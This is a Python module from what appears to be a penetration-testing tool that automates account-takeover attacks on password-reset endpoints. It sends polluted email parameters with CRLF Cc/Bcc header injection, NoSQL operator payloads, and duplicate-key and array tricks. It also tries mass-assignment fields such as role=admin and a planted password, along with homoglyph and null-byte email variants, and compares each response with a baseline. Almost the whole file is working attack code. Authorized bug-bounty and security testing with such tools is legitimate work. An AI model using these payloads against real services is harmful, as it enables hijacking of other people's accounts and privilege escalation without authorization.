#!/usr/bin/env python3

import sys
sys.dont_write_bytecode = True

from utils.style import Colors
from utils.utils import (
    requests,
    parse_headers,
    urllib3,
    re,
    traceback,
    get_domain_from_url,
    json,
    EMAIL_REGEX
)
import urllib.parse
import uuid


def inject_into_email_param(body, payload):
    # JSON
    try:
        data = json.loads(body)

        def replace_json(obj):
            if isinstance(obj, dict):
                return {k: replace_json(v) for k, v in obj.items()}
            elif isinstance(obj, list):
                return [replace_json(i) for i in obj]
            elif isinstance(obj, str):
                if re.search(EMAIL_REGEX, obj, re.IGNORECASE):
                    return obj + payload
            return obj

        new_data = replace_json(data)
        return json.dumps(new_data)

    except:
        pass

    # x-www-form-urlencoded
    try:
        parsed = urllib.parse.parse_qs(body, keep_blank_values=True)

        modified = False

        for key in parsed:
            for i, val in enumerate(parsed[key]):
                if re.search(EMAIL_REGEX, val, re.IGNORECASE):
                    parsed[key][i] = val + payload
                    modified = True

        if modified:
            return urllib.parse.urlencode(parsed, doseq=True)

    except:
        pass

    # multipart/form-data (simple)
    if "Content-Disposition" in body:
        def multipart_replace(match):
            value = match.group(1)
            if re.search(EMAIL_REGEX, value, re.IGNORECASE):
                return value + payload
            return value

        return re.sub(r"\r?\n\r?\n([^\r\n]+)",
                      lambda m: "\n\n" + multipart_replace(m),
                      body)

    # raw text fallback
    pattern = rf"([^\s&=,:]+?\s*[:=]\s*)({EMAIL_REGEX})"

    def replacer(match):
        return f"{match.group(1)}{match.group(2)}{payload}"

    return re.sub(pattern, replacer, body, flags=re.IGNORECASE)


def get_email_param_names(body):

    if not body:
        return []

    if isinstance(body, bytes):
        body = body.decode(errors="ignore")

    param_names = set()

    # -------------------------
    # JSON
    # -------------------------
    data = None

    if isinstance(body, dict):
        data = body
    else:
        try:
            data = json.loads(body.strip())
        except:
            pass

    if data is not None:
        def extract_json(obj):
            if isinstance(obj, dict):
                for k, v in obj.items():
                    if isinstance(v, str) and re.search(EMAIL_REGEX, v, re.IGNORECASE):
                        param_names.add(k)
                    else:
                        extract_json(v)

            elif isinstance(obj, list):
                for i in obj:
                    extract_json(i)

        extract_json(data)

    # -------------------------
    # form-urlencoded
    # -------------------------
    try:
        parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
        for key, values in parsed.items():
            for val in values:
                if re.search(EMAIL_REGEX, val, re.IGNORECASE):
                    param_names.add(key)
    except:
        pass

    # -------------------------
    # multipart
    # -------------------------
    parts = re.split(r"-{2,}.*", body)

    for part in parts:
        name_match = re.search(r'name="([^"]+)"', part)
        value_match = re.search(r"\r?\n\r?\n(.+)", part, re.DOTALL)

        if name_match and value_match:
            name = name_match.group(1)
            value = value_match.group(1).strip()

            if re.search(EMAIL_REGEX, value, re.IGNORECASE):
                param_names.add(name)

    # -------------------------
    # raw fallback
    # -------------------------
    matches = re.findall(
        rf'"?([^"\s:]+)"?\s*[:=]\s*"?({EMAIL_REGEX})"?',
        body,
        re.IGNORECASE
    )

    for key, _ in matches:
        param_names.add(key)

    return list(param_names)


def _extract_email_from_body(body):
    """Extract the first email found in the body."""
    match = re.search(EMAIL_REGEX, body, re.IGNORECASE)
    return match.group(0) if match else None


def _detect_content_type(headers):
    """Detect current content type from headers."""
    for k, v in headers.items():
        if k.lower() == "content-type":
            v_lower = v.lower()
            if "application/json" in v_lower:
                return "json"
            if "application/x-www-form-urlencoded" in v_lower:
                return "form"
            if "multipart/form-data" in v_lower:
                return "multipart"
    return "unknown"


def _parse_body_params(body, content_type):
    """
    Extract key-value pairs from body regardless of format.
    Returns list of (key, value) tuples.
    """
    params = []

    if content_type == "json":
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                for k, v in data.items():
                    params.append((k, v))
        except:
            pass

    elif content_type == "form":
        try:
            parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
            for k, vals in parsed.items():
                for v in vals:
                    params.append((k, v))
        except:
            pass

    elif content_type == "multipart":
        parts = re.findall(
            r'name="([^"]+)".*?\r?\n\r?\n([^\r\n-]+)',
            body, re.DOTALL
        )
        for k, v in parts:
            params.append((k, v.strip()))

    # Fallback: try both
    if not params:
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                for k, v in data.items():
                    params.append((k, v))
        except:
            try:
                parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
                for k, vals in parsed.items():
                    for v in vals:
                        params.append((k, v))
            except:
                pass

    return params


def _build_json_body(params):
    """Build JSON body from params."""
    data = {}
    for k, v in params:
        data[k] = v
    return json.dumps(data)


def _build_form_body(params):
    """Build form-urlencoded body from params."""
    return urllib.parse.urlencode(params)


def _build_multipart_body(params):
    """Build multipart/form-data body from params. Returns (body, content_type)."""
    boundary = f"----WebKitFormBoundary{uuid.uuid4().hex[:16]}"
    parts = []
    for k, v in params:
        parts.append(
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="{k}"\r\n'
            f"\r\n"
            f"{v}\r\n"
        )
    parts.append(f"--{boundary}--\r\n")
    body = "".join(parts)
    ct = f"multipart/form-data; boundary={boundary}"
    return body, ct


def _set_content_type(headers, content_type_value):
    """Return a copy of headers with Content-Type replaced."""
    new_headers = {}
    found = False
    for k, v in headers.items():
        if k.lower() == "content-type":
            new_headers[k] = content_type_value
            found = True
        else:
            new_headers[k] = v
    if not found:
        new_headers["Content-Type"] = content_type_value
    return new_headers


def body_transformation(url, parsed_req, baseline, interact, email, proxy=None):
    """
    Content-Type transformation + parameter format mutation.
    Tests how the backend handles the same data in different formats:

    1. Content-Type switching:
       - JSON → form-urlencoded → multipart (and reverse)
       - Backend may parse differently or skip validation on unexpected type

    2. Array notation:
       - email=victim → email[]=victim&email[]=attacker
       - {"email":"victim"} → {"email":["victim","attacker"]}
       - Some frameworks take first, others take last, others concat

    3. Type juggling:
       - {"email":"victim"} → {"email":{"email":"attacker"}}
       - {"email":true}, {"email":null}, {"email":0}
       - Triggers unexpected code paths in weakly-typed backends

    4. Parameter wrapping:
       - {"email":"victim"} → {"user":{"email":"attacker"}}
       - Rails mass assignment, Spring nested binding

    5. Duplicate keys in JSON:
       - {"email":"victim","email":"attacker"}
       - Parser-dependent: last-wins, first-wins, or error
    """
    print(f"{Colors.CYAN}   └── Body transformation{Colors.RESET}")

    original_host = parsed_req["host"]
    method = parsed_req["method"]
    path = parsed_req["path"]
    body = parsed_req["body"]
    headers = dict(parsed_req["headers"])
    scheme = "https" if "https" in url else "http"

    uri = f"{scheme}://{original_host}{path}"
    proxies = {"http": proxy, "https": proxy} if proxy else None

    if not body:
        print(f"  {Colors.YELLOW}[!] No body to transform{Colors.RESET}")
        return

    current_ct = _detect_content_type(headers)
    params = _parse_body_params(body, current_ct)
    victim_email = _extract_email_from_body(body)

    if not params or not victim_email:
        print(f"  {Colors.YELLOW}[!] Could not extract params or email from body{Colors.RESET}")
        return

    gepn = get_email_param_names(body)
    param_mail = gepn[0] if gepn else None
    if not param_mail:
        print(f"  {Colors.YELLOW}[!] Could not identify email parameter name{Colors.RESET}")
        return

    payloads = []

    # ─── 1. Content-Type switching ───────────────────────────────────────────
    # Convert current format to every other format
    ct_conversions = []

    if current_ct != "json":
        json_body = _build_json_body(params)
        json_headers = _set_content_type(headers, "application/json")
        ct_conversions.append((json_body, json_headers, f"CT-switch → JSON"))

    if current_ct != "form":
        str_params = [(k, str(v)) for k, v in params]
        form_body = _build_form_body(str_params)
        form_headers = _set_content_type(headers, "application/x-www-form-urlencoded")
        ct_conversions.append((form_body, form_headers, f"CT-switch → form-urlencoded"))

    if current_ct != "multipart":
        str_params = [(k, str(v)) for k, v in params]
        mp_body, mp_ct = _build_multipart_body(str_params)
        mp_headers = _set_content_type(headers, mp_ct)
        ct_conversions.append((mp_body, mp_headers, f"CT-switch → multipart"))

    # Wrong Content-Type (send JSON body with form CT and vice versa)
    if current_ct == "json":
        ct_conversions.append((body, _set_content_type(headers, "application/x-www-form-urlencoded"), "CT-mismatch → JSON body with form CT"))
        ct_conversions.append((body, _set_content_type(headers, "text/plain"), "CT-mismatch → JSON body with text/plain CT"))
    elif current_ct == "form":
        ct_conversions.append((body, _set_content_type(headers, "application/json"), "CT-mismatch → form body with JSON CT"))
        ct_conversions.append((body, _set_content_type(headers, "text/plain"), "CT-mismatch → form body with text/plain CT"))

    # No Content-Type at all
    no_ct_headers = {k: v for k, v in headers.items() if k.lower() != "content-type"}
    ct_conversions.append((body, no_ct_headers, "CT-removed → no Content-Type header"))

    for ct_body, ct_headers, desc in ct_conversions:
        payloads.append((ct_body, ct_headers, desc))

    # ─── 2. Array notation ───────────────────────────────────────────────────
    if current_ct == "json":
        try:
            data = json.loads(body)
            if isinstance(data, dict) and param_mail in data:
                # ["victim", "attacker"]
                data_arr = data.copy()
                data_arr[param_mail] = [victim_email, email]
                payloads.append((json.dumps(data_arr), headers, f"JSON array → [\"{victim_email}\",\"{email}\"]"))

                # ["attacker", "victim"] (reversed)
                data_arr_rev = data.copy()
                data_arr_rev[param_mail] = [email, victim_email]
                payloads.append((json.dumps(data_arr_rev), headers, f"JSON array reversed → [\"{email}\",\"{victim_email}\"]"))

                # attacker only in array
                data_arr_single = data.copy()
                data_arr_single[param_mail] = [email]
                payloads.append((json.dumps(data_arr_single), headers, f"JSON array single → [\"{email}\"]"))
        except:
            pass

    elif current_ct == "form":
        # email[]=victim&email[]=attacker
        arr_body = f"{param_mail}[]={urllib.parse.quote(victim_email)}&{param_mail}[]={urllib.parse.quote(email)}"
        # Keep other params
        try:
            parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
            other_params = []
            for k, vals in parsed.items():
                if k != param_mail:
                    for v in vals:
                        other_params.append(f"{urllib.parse.quote(k)}={urllib.parse.quote(v)}")
            if other_params:
                arr_body = "&".join(other_params) + "&" + arr_body
        except:
            pass
        payloads.append((arr_body, headers, f"form array → {param_mail}[]={victim_email}&{param_mail}[]={email}"))

        # Reversed
        arr_body_rev = f"{param_mail}[]={urllib.parse.quote(email)}&{param_mail}[]={urllib.parse.quote(victim_email)}"
        if other_params:
            arr_body_rev = "&".join(other_params) + "&" + arr_body_rev
        payloads.append((arr_body_rev, headers, f"form array reversed → {param_mail}[]={email}&{param_mail}[]={victim_email}"))

    # ─── 3. Type juggling (JSON only) ────────────────────────────────────────
    if current_ct == "json":
        try:
            data = json.loads(body)
            if isinstance(data, dict) and param_mail in data:
                juggle_values = [
                    (True, "bool-true"),
                    (False, "bool-false"),
                    (None, "null"),
                    (0, "int-zero"),
                    (1, "int-one"),
                    ("", "empty-string"),
                    ({param_mail: email}, "nested-object"),
                    ({"$ne": ""}, "nosql-ne"),
                    ({"$gt": ""}, "nosql-gt"),
                    ({"$regex": ".*"}, "nosql-regex"),
                ]
                for val, desc in juggle_values:
                    data_j = data.copy()
                    data_j[param_mail] = val
                    payloads.append((json.dumps(data_j), headers, f"type-juggle → {param_mail}={desc}"))
        except:
            pass

    # ─── 4. Parameter wrapping / mass assignment ─────────────────────────────
    if current_ct == "json":
        try:
            data = json.loads(body)
            if isinstance(data, dict):
                # Wrap in common parent keys (Rails, Django, Spring patterns)
                wrappers = ["user", "account", "member", "profile", "data", "params", "attributes"]
                for w in wrappers:
                    wrapped = {w: {param_mail: email}}
                    # Merge with original body (keep other params at root)
                    merged = data.copy()
                    merged[w] = {param_mail: email}
                    payloads.append((json.dumps(merged), headers, f"mass-assign → {w}.{param_mail}={email}"))

                # Add extra fields at root level
                extra_fields = [
                    ("password", "Pwned123!", "inject-password"),
                    ("new_password", "Pwned123!", "inject-new_password"),
                    ("role", "admin", "inject-role"),
                    ("admin", True, "inject-admin"),
                    ("is_admin", True, "inject-is_admin"),
                    ("verified", True, "inject-verified"),
                    ("email_verified", True, "inject-email_verified"),
                    ("user_id", 1, "inject-user_id"),
                    ("id", 1, "inject-id"),
                ]
                for field, val, desc in extra_fields:
                    if field not in data:
                        data_extra = data.copy()
                        data_extra[field] = val
                        payloads.append((json.dumps(data_extra), headers, f"mass-assign → {desc}"))
        except:
            pass

    # ─── 5. Duplicate keys in JSON (raw string, not via json.dumps) ──────────
    if current_ct == "json":
        try:
            data = json.loads(body)
            if isinstance(data, dict) and param_mail in data:
                # Build JSON manually with duplicate key
                # First victim, then attacker (last-wins on most parsers)
                parts = []
                for k, v in data.items():
                    parts.append(f'"{k}":{json.dumps(v)}')
                parts.append(f'"{param_mail}":{json.dumps(email)}')
                dupe_body = "{" + ",".join(parts) + "}"
                payloads.append((dupe_body, headers, f"dupe-key → {param_mail}={victim_email} then {param_mail}={email}"))

                # Attacker first, then victim (first-wins on some parsers)
                parts2 = [f'"{param_mail}":{json.dumps(email)}']
                for k, v in data.items():
                    parts2.append(f'"{k}":{json.dumps(v)}')
                dupe_body2 = "{" + ",".join(parts2) + "}"
                payloads.append((dupe_body2, headers, f"dupe-key → {param_mail}={email} then {param_mail}={victim_email}"))
        except:
            pass

    # ─── 6. Wildcard / catch-all email variations ────────────────────────────
    email_parts = email.split("@") if "@" in email else None
    victim_parts = victim_email.split("@") if "@" in victim_email else None

    if email_parts and victim_parts:
        email_variations = [
            # Sub-addressing (plus trick)
            (f"{victim_parts[0]}+anything@{victim_parts[1]}", "sub-addressing-victim"),
            # Case manipulation
            (victim_email.upper(), "uppercase-email"),
            (victim_email[0].upper() + victim_email[1:], "capitalize-first"),
            # Dots trick (Gmail ignores dots)
            (f"{victim_parts[0][0]}.{victim_parts[0][1:]}@{victim_parts[1]}", "dot-injection"),
            # Trailing/leading whitespace
            (f" {victim_email}", "leading-space"),
            (f"{victim_email} ", "trailing-space"),
            (f"{victim_email}\t", "trailing-tab"),
            # Null byte
            (f"{victim_email}%00", "null-byte-suffix"),
            (f"{victim_email}\x00", "raw-null-byte"),
            # Unicode normalization
            (victim_email.replace("a", "\u0430", 1), "homoglyph-email"),
        ]

        for varied_email, desc in email_variations:
            if current_ct == "json":
                try:
                    data = json.loads(body)
                    data[param_mail] = varied_email
                    payloads.append((json.dumps(data), headers, f"email-variation → {desc}"))
                except:
                    pass
            elif current_ct == "form":
                try:
                    parsed = urllib.parse.parse_qs(body, keep_blank_values=True)
                    parsed[param_mail] = [varied_email]
                    var_body = urllib.parse.urlencode(parsed, doseq=True)
                    payloads.append((var_body, headers, f"email-variation → {desc}"))
                except:
                    pass

    # ─── Send all payloads ───────────────────────────────────────────────────
    for p_body, p_headers, desc in payloads:
        # Truncate body for display (multipart can be huge)
        body_display = p_body if len(p_body) <= 300 else p_body[:300] + "..."
        # CT used
        ct_display = ""
        for k, v in p_headers.items():
            if k.lower() == "content-type":
                ct_display = f" | CT: {v.split(';')[0]}"
                break

        payload_tag = f"{body_display}"

        try:
            resp = requests.request(
                method=method, url=uri, headers=p_headers,
                data=p_body, verify=False, allow_redirects=False,
                timeout=10, proxies=proxies,
            )

            # Status diff
            if resp.status_code != baseline['status']:
                print(f"{Colors.YELLOW}   └── [STATUS ≠ BASELINE] {resp.status_code} ≠ {baseline['status']} | {payload_tag}{Colors.RESET}")

            # Body length diff
            if abs(len(resp.text) - baseline['body_length']) > 50:
                print(f"{Colors.YELLOW}   └── [LENGTH ≠ BASELINE] {len(resp.text)}b ≠ {baseline['body_length']}b | {payload_tag}{Colors.RESET}")

            # Reflection checks
            if email in resp.text:
                print(f"{Colors.GREEN}   └── [+] {email} reflected in body | {payload_tag}{Colors.RESET}")
            if email in str(resp.headers):
                print(f"{Colors.GREEN}   └── [+] {email} reflected in headers | {payload_tag}{Colors.RESET}")

            # Success indicators in response
            resp_lower = resp.text.lower()
            success_indicators = ["success", "email sent", "password reset", "reset link", "check your email", "token"]
            for indicator in success_indicators:
                if indicator in resp_lower and resp.status_code in (200, 201, 202, 204):
                    print(f"{Colors.GREEN}   └── [+] success indicator '{indicator}' in response | {payload_tag}{Colors.RESET}")
                    break

        except requests.RequestException as e:
            print(f"  {Colors.RED}[!] request error ({desc}): {e}{Colors.RESET}")


def data_pollution(url, parsed_req, baseline, interact, email, proxy=None):
    """
    https://github.com/tuhin1729/Bug-Bounty-Methodology/blob/main/PasswordReset.md
    https://hacktricks.wiki/en/pentesting-web/reset-password.html
    https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Account%20Takeover#password-reset-token-leak-via-referrer
    https://web.archive.org/web/20250626114943/https://anugrahsr.github.io/posts/10-Password-reset-flaws/
    """
    print(f"{Colors.CYAN}   └── Data pollution{Colors.RESET}")

    original_host = parsed_req["host"]
    method = parsed_req["method"]
    path = parsed_req["path"]
    body = parsed_req["body"]
    headers = dict(parsed_req["headers"])
    scheme = "https" if "https" in url else "http"

    uri = f"{scheme}://{original_host}{path}"
    proxies = {"http": proxy, "https": proxy} if proxy else None

    gepn = get_email_param_names(body)
    if len(gepn) == 1:
        param_mail = gepn[0]
        email_payloads = [
            f"&{param_mail}={email}",
            f"%20{param_mail}={email}",
            f"|{param_mail}={email}",
            f",{param_mail}={email}",
            f";{param_mail}={email}",
            f"&{email}",
            f"%20{email}",
            f"|{email}",
            f",{email}",
            f";{email}",
            f"%0ACc:{email}",
            f"%0ABcc:{email}",
            f"%0D%0ACc:{email}",
            f"%0A%0Dcc:{email}",
            f"%0A%0Dbcc:{email}",
            f"%20%0d%0aTo:{email}"
        ]
        if re.search(EMAIL_REGEX, body, re.IGNORECASE):
            for ep in email_payloads:
                body_injected = inject_into_email_param(body, ep)
                body_display = body_injected if len(body_injected) <= 300 else body_injected[:300] + "..."
                payload_tag = f"{ep} → BODY: {body_display}"
                try:
                    resp_bi = requests.request(
                        method=method, url=uri, headers=headers,
                        data=body_injected, verify=False, allow_redirects=False,
                        timeout=10, proxies=proxies,
                    )
                    if resp_bi.status_code != baseline['status']:
                        print(f"{Colors.YELLOW}   └── [STATUS ≠ BASELINE] {resp_bi.status_code} ≠ {baseline['status']} | {payload_tag}{Colors.RESET}")
                    if abs(len(resp_bi.text) - baseline['body_length']) > 50:
                        print(f"{Colors.YELLOW}   └── [LENGTH ≠ BASELINE] {len(resp_bi.text)}b ≠ {baseline['body_length']}b | {payload_tag}{Colors.RESET}")

                except requests.RequestException as e:
                    print(f"  {Colors.RED}[!] request error: {e}{Colors.RESET}")


def parameters_pollution(url, parsed_req, baseline, interact, email, proxy=None):
    print(f"{Colors.CYAN} ├ Parameters pollution analysis{Colors.RESET}")
    data_pollution(url, parsed_req, baseline, interact, email, proxy)
    body_transformation(url, parsed_req, baseline, interact, email, proxy)